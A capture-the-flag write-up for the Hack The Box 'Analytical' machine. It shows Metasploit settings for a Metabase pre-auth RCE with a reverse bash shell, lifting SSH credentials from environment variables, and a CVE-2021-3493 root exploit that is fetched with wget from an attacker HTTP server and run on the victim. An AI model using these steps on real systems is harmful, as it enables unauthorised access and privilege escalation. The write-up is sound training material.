# Enumeration

The nmap scan reveals two open ports 22 for ssh and 80 where a website is hostet with the dnsname http://analytical.htb

## Enter domain to hosts-file

```
echo '10.10.11.233 analytical.htb | sudo tee -a /etc/hosts'
```

## Login-Panel and adding subdomain

On the website we find the subdomain data.analytical.htb . href of the Login-Button.

```
echo '10.10.11.233 data.analytical.htb | sudo tee -a /etc/hosts'
```

# Foothoold

The Loginpage leads us to the Software Metabase. By google 'metabase exploit' one of the first links is about a Pre-Auth RCE. https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/

This article explains it in detail. By searching for the setup-token at the sourcecode of the login-pages it is verified this works. 

## Using Metasploit to gain access

By starting Metasploit and searching for Metabase we get one result which we select by use 0.

```
msfconsole
search Metabase
use 0
```

```
Module options(exploit/linux/http/metabase_setup_token_rce):
RHOSTS     data.analytical.htb  
RPORT      80
TARGETURI  / 
```
```
Payload options(cmd/unix/reverse_bash):
LHOST  tun0
LPORT  4444
```

## User SSHlogin

```
env
```

Gives us a META_PASS and META_USER which are the ssh credentials.

# Priviliges Escalation 

## Briskets

```
cat /etc/os-release
```

Reveals the Ubuntu 20.04 LTS which is vulnerable for the briskets.

https://github.com/briskets/CVE-2021-3493

On attacker site
```
git clone https://github.com/briskets/CVE-2021-3493
cd CVE-2021-3493/
gcc exploit.c -o exploit
python3 -m http.server PORT
```

On victim site 
```
wget http://IP:PORT/exploit
chmod +x exploit
./exploit
```





